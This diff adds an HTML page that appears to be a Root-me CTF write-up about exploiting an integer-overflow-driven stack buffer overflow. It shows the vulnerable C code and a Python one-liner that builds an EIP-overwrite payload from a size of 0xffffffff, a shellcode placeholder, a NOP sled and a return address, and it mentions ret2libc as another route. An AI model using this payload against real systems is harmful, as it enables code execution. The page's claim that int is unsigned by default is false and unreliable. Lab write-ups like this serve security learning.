@@ -1,0 +1,99 @@
+<html>
+ <head>
+<title> Integer Overflow  </title>
+
+ <link rel="stylesheet" type="text/css" href="test1.css" />
+ <link rel="stylesheet" type="text/css" href="fonts.css" />
+</head>
+<style>
+
+      body {background-color:white;
+	border-bottom:1px solid #bfbfbf
+         line-height:1.5em;
+	color:#222}
+ 
+   p{color:black;
+        /*font-style: italic;
+       font-family: "Times New Roman";*/
+      letter-spacing: 2px;
+       font-size: 20px;
+       margin-top: 10px;
+       margin-bottom: 10px;
+        margin-right: 150px;
+       margin-left: 150px; 
+       }
+
+
+
+    h1{ color:black;
+         font-style: italic;
+        font-size:2.2em;
+	font-family:"PT Serif","Georgia","Helvetica Neue",Arial,sans-serif;
+	font-weight:normal;
+	line-height:1.2em;
+	margin-bottom:0.6667em
+        margin-right: 150px;
+       margin-left: 150px;}
+
+code { 
+display: block; white-space: pre-wrap; 
+border: 1px solid #000; 
+padding: 10px; 
+line-height: 1.5em; 
+font-family: "Lucida Console", Monaco, monospace; 
+} 
+.code-str 
+{ color:#ff33d4; } 
+ .code-comment { color:#3c33ff; } 
+ .code-key { color:#9933ff; }
+ .code-brown{color:#ba4a00} 
+
+
+</style>
+<body>
+
+<script src="null.js"></script>
+
+<div style="position: relative; background: url('http://hackerbuck.net23.net/css/bgm.png'); width: 1210px; height: 110px;">
+ <div style="position: absolute; bottom: 0; left: 0.5em; width: 400px; font-weight: bold; color: #fff;">
+ <p style="color:white;font-size:2.2em;"> Root-me </p>
+ </div>
+ </div>
+
+
+ <br> <br>  <br>          
+
+<h1 class="post-title"> Stack buffer and integer overflow </h1>
+   
+ <br> 
+
+<code>  int size;  
+        if(read(fd, &size, sizeof(int)) != sizeof(int))  # the vulnerable part !!!
+        .....
+          if(size >= BUFFER)
+    {
+      printf("[-] Path too long.\n");
+      exit(0);
+    }
+   .....
+    while(read(fd, data, 1) == 1 && *data && size)
+ 
+</code>
+
+<p> This code has a integer overflow bug getting a char input in integer causes the size var to overflow if we give ascii value  of 0xffffffff <br>
+     hence after overflowing int we get size= -1 therfore we can read as many bytes we want that's it capture eip !!! <br>
+     But the &(buffer) differ in gdb and outside figuring that was little bit tough job somehow by luck i got it right :)  </p>
+
+<br>
+
+<code>python -c 'import struct;print struct.pack("<I",0xffffffff)+"/"+"shellcode(23 bytes)"+"\x90"*117+struct.pack("<I",0xbffffbb0)' > /tmp/siva/imp</code>
+
+<br>
+
+<h2>Another Method</h2>
+
+<p> You could also use ret2libc attack the advantage is you need not guess &(buffer) coz only addr of var at stack differ with gdb but not the addr at libc ..<br>
+    The int is by default unsigned so to give -1 you have to supply it's 2's compliment i.e 0xffffffff </p>
+
+</body>
+</html>
